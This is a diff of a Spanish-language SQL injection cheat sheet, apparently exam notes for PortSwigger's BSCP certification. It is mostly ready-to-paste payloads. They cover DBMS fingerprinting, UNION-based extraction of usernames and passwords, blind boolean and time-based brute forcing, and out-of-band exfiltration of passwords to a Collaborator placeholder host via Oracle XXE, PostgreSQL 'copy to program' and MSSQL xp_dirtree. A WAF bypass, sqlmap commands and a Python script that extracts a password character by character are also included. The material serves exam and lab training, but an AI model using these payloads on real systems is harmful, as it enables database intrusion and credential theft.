@@ -2,133 +2,97 @@ PortSwigger cheat sheet:
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 --------
+
 # SQL Injection — (BSCP)
 
-## 1. Confirmar el punto de inyección y contar columnas
+## 1. Contar columnas
 
 ```sql
 ' order by 10-- -
-```
-
-```sql
 ' UNION SELECT NULL-- -
 ' UNION SELECT NULL,NULL-- -
 ```
 
+Sube hasta que deje de dar error → nº de columnas confirmado.
+
 ---
 
-## 2. Identificar el DBMS — **MUY IMPORTANTE**
+## 2. Identificar el motor (fingerprinting) — payloads listos para copiar/pegar
 
-Esta es la fase que más suele bloquear: antes de lanzar payloads específicos, usa estas pruebas cruzadas. Con 2-3 de ellas ya tienes el motor confirmado.
+Lanza uno a uno contra el punto de inyección. En cuanto uno dé respuesta "true"/normal (o el error esperado) → motor identificado.
 
-### 2.1 Heurísticas rápidas (primera pasada)
+**Concatenación**
 
-|Prueba|Si funciona →|Si NO funciona →|
-|---|---|---|
-|`'a'+'b'` concatena|Microsoft SQL Server|Descarta MSSQL|
-|`'a'||'b'` concatena|
-|`'a' 'b'` (con espacio) concatena|MySQL / MariaDB|Descarta MySQL|
-|Un `SELECT` sin `FROM` da error y necesitas `FROM dual`|Oracle|Descarta Oracle|
-|`#comentario` trunca la query|MySQL / MariaDB|Descarta MySQL|
-|`-- comentario` (con espacio tras `--`) trunca, pero `--comentario` (sin espacio) no|MySQL / MariaDB|—|
-|`--comentario` (sin espacio) trunca perfectamente|Oracle, MSSQL o PostgreSQL|—|
-
-Con esto sueles reducir a un único candidato. Para confirmarlo del todo, usa la tabla completa de abajo (viene directamente del cheat sheet oficial de PortSwigger, es la referencia que deberías memorizar).
-
-### 2.2 Tabla comparativa completa
-
-**Concatenación de strings**
-
-|Motor|Sintaxis|
+|Motor|Payload|
 |---|---|
-|Oracle|`'foo'|
-|Microsoft|`'foo'+'bar'`|
-|PostgreSQL|`'foo'|
-|MySQL|`'foo' 'bar'` (con espacio) — o `CONCAT('foo','bar')` (funciona en todos)|
+|MSSQL|`' AND 'a'+'a'='aa'-- -`|
+|Oracle / PostgreSQL|`' AND 'a'|
+|MySQL / MariaDB|`' AND 'a' 'a'='aa'-- -`|
 
 **Comentarios**
 
-|Motor|Sintaxis|
+|Payload|Resultado esperado|
 |---|---|
-|Oracle|`--comentario`|
-|Microsoft|`--comentario` / `/*comentario*/`|
-|PostgreSQL|`--comentario` / `/*comentario*/`|
-|MySQL|`#comentario` / `-- comentario` (⚠️ requiere espacio tras `--`) / `/*comentario*/`|
+|`' OR '1'='1'#`|Solo trunca en MySQL/MariaDB|
+|`' OR '1'='1'--x`|Falla en MySQL/MariaDB (falta espacio tras `--`); trunca bien en el resto|
 
-**Versión del motor**
+**Tabla `dual` (Oracle)**
 
-```sql
--- Oracle
-SELECT banner FROM v$version
-SELECT version FROM v$instance
-
--- Microsoft
-SELECT @@version
-
--- PostgreSQL
-SELECT version()
-
--- MySQL / MariaDB
-SELECT @@version
-```
-
-**Batched / stacked queries (¿se pueden ejecutar dos queries seguidas?)**
-
-|Motor|¿Soporta?|
+|Payload|Resultado esperado|
 |---|---|
-|Oracle|No soporta batched queries|
-|Microsoft|Sí: `QUERY-1; QUERY-2`|
-|PostgreSQL|Sí: `QUERY-1; QUERY-2`|
-|MySQL|Normalmente NO explotable vía inyección (depende de la API usada por la app: con PHP `mysqli`/Python `MySQLdb` estándar no funciona; con ciertas APIs multi-statement sí)|
+|`' UNION SELECT NULL-- -`|Falla en Oracle (falta FROM)|
+|`' UNION SELECT NULL FROM dual-- -`|Si esto funciona tras fallar el anterior → Oracle|
 
-Si consigues ejecutar un `;` seguido de una segunda query que se ejecute (confírmalo con un `SLEEP`/`WAITFOR` de control), ya sabes que **no es Oracle**, y si además el `;` funciona con normalidad probablemente sea **MSSQL o PostgreSQL** (en MySQL suele fallar salvo casos concretos).
+**Versión** (ajusta nº de columnas según el paso 1)
 
-### 2.3 Confirmación por comportamiento del casteo de tipos (útil para blind/error-based)
+|Motor|Payload|
+|---|---|
+|Oracle|`' UNION SELECT NULL,banner FROM v$version-- -`|
+|MSSQL|`' UNION SELECT NULL,@@version-- -`|
+|PostgreSQL|`' UNION SELECT NULL,version()-- -`|
+|MySQL / MariaDB|`' UNION SELECT NULL,@@version-- -`|
 
-```sql
--- Oracle
-SELECT CASE WHEN (condicion) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+**Confirmación extra por error de tipos** (si lo anterior no es concluyente)
 
--- Microsoft
-SELECT CASE WHEN (condicion) THEN 1/0 ELSE NULL END
+|Motor|Payload|
+|---|---|
+|Oracle|`' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 1 END FROM dual)-- -`|
+|MSSQL|`' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)-- -`|
+|PostgreSQL|`' AND 1=(SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)-- -`|
+|MySQL / MariaDB|`' AND 1=IF(1=1,(SELECT table_name FROM information_schema.tables),1)-- -`|
 
--- PostgreSQL
-1 = (SELECT CASE WHEN (condicion) THEN 1/(SELECT 0) ELSE NULL END)
+**Batched queries**
 
--- MySQL
-SELECT IF(condicion,(SELECT table_name FROM information_schema.tables),'a')
-```
-
-Si tu error de división por cero solo aparece con la sintaxis `TO_CHAR(1/0)` + `FROM dual` → Oracle. Si aparece con `IF(...)` → MySQL. Etc.
+|Payload|Resultado esperado|
+|---|---|
+|`';SELECT 1-- -`|Sin error → MSSQL o PostgreSQL. Error → Oracle (no soporta) o MySQL (normalmente bloqueado)|
 
 ---
 
-## 3. Payloads genéricos de blind boolean (fase de descubrimiento, antes de saber el motor exacto)
+## 3. Payloads genéricos de blind boolean (mientras confirmas el motor)
 
-Estos suelen funcionar igual (o casi igual) en varios motores porque usan sintaxis SQL estándar (`AND`, `SELECT`, `CAST`). Úsalos para confirmar que la inyección es explotable a ciegas mientras terminas de identificar el motor exacto.
-
--- **_Comprobar si existe una tabla / condición general_**
+-- **_Comprobar condición general_**
 
 ```sql
 TrackingId=xyz' AND (SELECT 'a' FROM <table> LIMIT 1)='a
 TrackingId=G6gw8KYi6CTDMGv3' and (select 'a' from <table> where <column>='<value>')='a'-- -
 ```
 
--- **_Comprobar longitud de la contraseña (boolean)_**
+-- **_Longitud de contraseña (boolean)_**
 
 ```sql
 TrackingId=xyz' AND (SELECT 'a' FROM <table> WHERE <user_column>='<username>' AND LENGTH(<password_column>)>1)='a
 ' and (select 'a' from <table> where <user_column>='<username>' and length(<password_column>)=20)='a'-- -
 ```
 
--- **_Brute force de la contraseña, carácter a carácter (boolean)_**
+-- **_Brute force carácter a carácter (boolean)_**
 
 ```sql
 TrackingId=xyz' AND (SELECT SUBSTRING(<password_column>,1,1) FROM <table> WHERE <user_column>='<username>')='a
 ' and (select substring(<password_column>,1,1) from <table> where <user_column>='<username>')='o'-- -
 ```
 
--- **_Error-based visible (casting)_** — ⚠️ `CAST(x AS INT)` funciona tal cual en Oracle/PostgreSQL/MSSQL; en MySQL usa `EXTRACTVALUE`/`UPDATEXML` (ver sección MySQL) porque su sintaxis de cast es distinta.
+-- **_Error-based visible (casting)_** — `CAST(x AS INT)` vale para Oracle/PostgreSQL/MSSQL; en MySQL usa EXTRACTVALUE (sección MySQL).
 
 ```sql
 ' or 1=cast((select <password_column> from <table> limit 1) as INT) -- -
@@ -206,15 +170,15 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM <tab
 ' SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')-- -
 ```
 
--- **_OOB (Collaborator) — DNS lookup con exfiltración de datos_**
+-- **_OOB (Collaborator) — con exfiltración de datos_**
 
 ```sql
 ' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select <password_column> from <table> where <user_column>='<username>')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
 ```
 
-> ⚠️ La técnica `EXTRACTVALUE`/XXE de arriba funciona en instalaciones sin parchear. En instalaciones parcheadas necesitas privilegios elevados para usar `UTL_INADDR.get_host_address`.
+⚠️ EXTRACTVALUE/XXE: solo en instalaciones sin parchear. `UTL_INADDR`: requiere privilegios elevados.
 
--- **_Batched queries_** — Oracle **no soporta** batched/stacked queries. Si necesitas ejecutar una segunda sentencia, no es el camino en este motor.
+-- **_Batched queries_** — no soportado en Oracle.
 
 ---
 
@@ -243,26 +207,21 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM <tab
 
 ```sql
 ' union select NULL, schema_name from information_schema.schemata -- -
-' union select NULL, string_agg(schema_name, ',') from information_schema.schemata-- -
 ```
-
-> Nota: PostgreSQL **no tiene** `group_concat()` (eso es MySQL) — el equivalente es `string_agg(columna, separador)`.
 
 -- **_Listar tablas_**
 
 ```sql
 ' union select NULL, table_name from information_schema.tables where table_schema='<schema>' -- -
-' union select NULL, string_agg(table_name, ',') from information_schema.tables where table_schema='<schema>'-- -
 ```
 
 -- **_Listar columnas_**
 
 ```sql
 ' union select NULL, column_name from information_schema.columns where table_schema='<schema>' and table_name='<table>' -- -
-' union select NULL, string_agg(column_name, ',') from information_schema.columns where table_name='<table>'-- -
 ```
 
--- **_Extraer datos_** — ⚠️ PostgreSQL **no soporta** notación cruzada `<db>.<table>` como MySQL/MSSQL (cada conexión está atada a una sola base de datos); usa `<schema>.<table>` dentro de la misma BD.
+-- **_Extraer datos_** — ⚠️ sin cross-database (`<db>.<table>` no existe aquí); usa `<schema>.<table>`.
 
 ```sql
 ' union select NULL, <user_column>||':'||<password_column> from <schema>.<table> -- -
@@ -285,7 +244,7 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM <tab
 '; SELECT CASE WHEN (<user_column>='<username>' AND SUBSTRING(<password_column>,1,1)='1') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM <table>-- -
 ```
 
--- **_Batched queries_** — PostgreSQL sí soporta: `QUERY-1; QUERY-2`.
+-- **_Batched queries_** — soportado: `QUERY-1; QUERY-2`.
 
 -- **_OOB (Collaborator) — DNS lookup_**
 
@@ -293,7 +252,7 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM <tab
 copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
 ```
 
--- **_OOB (Collaborator) — DNS lookup con exfiltración de datos_**
+-- **_OOB (Collaborator) — con exfiltración de datos_**
 
 ```sql
 create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer; SELECT f();
@@ -334,11 +293,11 @@ create OR replace function f() returns void as $$ declare c text; declare p text
 ' union select 1, column_name from information_schema.columns where table_name='<table>'-- -
 ```
 
--- **_Extraer datos_**
+-- **_Extraer datos_** — usa `concat()` primero (más fiable en la práctica); `group_concat()` solo si necesitas juntar varias filas en 1 sola y `concat()` no te sirve para eso.
 
 ```sql
-' union select group_concat(<column1>,":",<column2>) from <db>.<table>-- -
 ' union select NULL, concat(<column1>,':', <column2>) from <db>.<table> -- -
+' union select group_concat(<column1>,":",<column2>) from <db>.<table>-- -
 ```
 
 -- **_Error condicional_**
@@ -375,7 +334,7 @@ LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
 SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 ```
 
--- **_Batched queries_** — normalmente **no explotable** vía inyección salvo que la app use una API concreta que permita multi-statement (algunas configuraciones de PHP/Python). No lo des por hecho por defecto.
+-- **_Batched queries_** — normalmente NO explotable (depende de la API que use la app).
 
 ---
 
@@ -437,7 +396,7 @@ SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 ' IF (1=1) WAITFOR DELAY '0:0:20'-- -
 ```
 
--- **_Batched queries_** — MSSQL sí soporta: `QUERY-1; QUERY-2`.
+-- **_Batched queries_** — soportado: `QUERY-1; QUERY-2`.
 
 -- **_OOB (Collaborator) — DNS lookup_**
 
@@ -445,7 +404,7 @@ SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
 ```
 
--- **_OOB (Collaborator) — DNS lookup con exfiltración de datos_**
+-- **_OOB (Collaborator) — con exfiltración de datos_**
 
 ```sql
 declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
@@ -453,7 +412,7 @@ declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtre
 
 ---
 
-## 8. HACKVERTOR — bypass de WAF vía entidades XML (extensión Burp)
+## 8. HACKVERTOR — bypass WAF vía entidades XML (extensión Burp)
 
 ```xml
 <@hex_entities>UNION SELECT NULL<@/hex_entities>
@@ -467,14 +426,10 @@ declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtre
 
 ## 9. SQLMAP
 
--- **_Básico_**
-
 ```bash
 sqlmap -u '' --cookie='' --random-agent -p order --level 5 --risk 1 --batch --dbms='postgresql'
 sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*" --cookie="_lab=<change-me>; session=<change-me>" --batch --risk 3 --level 5 --dbms=postgresql --dbs
 ```
-
--- **_Enumeración_**
 
 ```bash
 -u url
@@ -482,8 +437,6 @@ sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*" --cookie="_lab=<chan
 -D '<db>' --tables
 -D '<db>' -T '<table>' --columns
 ```
-
--- **_Inyección de query custom_**
 
 ```bash
 sqlmap -u 'https://TARGET.web-security-academy.net/filter?category=Tech+gifts' -p category --sql-query "SELECT <column1>, <column2> FROM <db>.<table>"
@@ -507,9 +460,7 @@ def exploit():
     for pos in range(1, 21):
         found = False
         for c in charset:
-            # Ajusta el payload según el lab / DBMS detectado
             payload = f"xyz' AND (SELECT SUBSTRING(<password_column>,{pos},1) FROM <table> WHERE <user_column>='<username>')='{c}'-- -"
-
             try:
                 r = requests.get(URL, cookies={"TrackingId": payload, "session": COOKIE})
                 if SUCCESS_STR in r.text:
@@ -521,7 +472,6 @@ def exploit():
             except Exception as e:
                 print(f"\n[!] Error: {e}")
                 sys.exit(1)
-
         if not found:
             break
 
@@ -531,11 +481,6 @@ if __name__ == "__main__":
     exploit()
 ```
 
----
-
-### Fuente principal
-
-- https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 ---
 
